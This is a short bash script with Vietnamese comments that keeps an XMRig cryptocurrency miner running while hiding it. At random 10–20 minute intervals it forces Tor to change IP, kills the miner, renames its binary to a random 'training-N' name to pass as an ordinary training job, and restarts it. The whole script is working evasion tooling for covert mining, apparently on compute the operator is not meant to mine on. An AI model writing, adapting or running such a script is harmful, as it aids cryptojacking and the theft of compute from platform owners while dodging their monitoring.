#!/bin/bash

# Tính thời gian ngẫu nhiên để đổi IP (từ 10 đến 20 phút)
while true; do
  sleep_time=$(shuf -i 600-1200 -n 1)  # Ngẫu nhiên từ 10-20 phút
  sleep $sleep_time
  
  echo "Đang yêu cầu Tor thay đổi IP..."
  kill -HUP $(pgrep tor)
  echo "Tor đã thay đổi IP."

  # Đổi tên XMRig
  echo "Đổi tên XMRig..."
  if [ -f /root/xmrig_name.txt ]; then
    pkill -f $(cat /root/xmrig_name.txt)
  fi

  RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
  mv /root/work/xmrig /root/work/$RANDOM_NAME
  echo $RANDOM_NAME > /root/xmrig_name.txt

  # Cấp quyền chạy cho file mới
  chmod +x /root/work/$RANDOM_NAME
  /root/start.sh  # Khởi động lại XMRig sau khi đổi IP và tên
done
